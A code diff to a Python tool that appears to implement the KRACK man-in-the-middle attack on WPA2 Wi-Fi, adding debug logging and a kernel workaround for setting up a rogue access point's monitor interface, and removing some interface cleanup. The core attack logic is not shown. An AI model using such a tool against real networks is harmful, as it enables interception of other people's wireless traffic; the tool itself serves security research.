@@ -11,7 +11,6 @@ from wpaspy import Ctrl
 #
 # - If EAPOL-Msg4 has been received on the real channel, the MitM attack has failed (maybe deauthenticate then)
 #
-# - Delete created *sta virtual interfaces
 # - Detect usage off all-zero key by decrypting frames (so we can miss some frames safely)
 # - Handle forwarded messages that are too long (= stupid Linux kernel bug)
 # - Prefix Warning or Error messages? What if they are just colored?
@@ -67,6 +66,7 @@ class MitmSocket(L2Socket):
 		subprocess.check_output(["iw", self.iface, "set", "channel", str(channel)])
 
 	def attach_filter(self, bpf):
+		log(DEBUG, "Attaching filter to %s: <%s>" % (self.iface, bpf))
 		attach_filter(self.ins, bpf, self.iface)
 
 	def send(self, p):
@@ -741,6 +741,14 @@ class KRAckAttack():
 		if self.nic_rogue_mon is None:
 			self.nic_rogue_mon = self.nic_rogue_ap + "mon"
 			subprocess.check_output(["iw", self.nic_rogue_ap, "interface", "add", self.nic_rogue_mon, "type", "monitor"])
+			# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
+			# sequence of commands to assure the virtual interface is registered as a 802.11 monitor interface.
+			subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
+			time.sleep(0.2)
+			subprocess.check_output(["ifconfig", self.nic_rogue_mon, "down"])
+			subprocess.check_output(["iw", self.nic_rogue_mon, "set", "type", "monitor"])
+			subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
+
 
 		# 3. Configure interface on real channel to ACK frames
 		if self.clientmac:
@@ -851,9 +859,6 @@ class KRAckAttack():
 			self.hostapd.wait()
 		if self.hostapd_log:
 			self.hostapd_log.close()
-		# TODO: What to do about this?
-		if self.clientmac:
-			subprocess.call(["iw", nic_real + "sta1", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
 		if self.sock_real: self.sock_real.close()
 		if self.sock_rogue: self.sock_rogue.close()
 
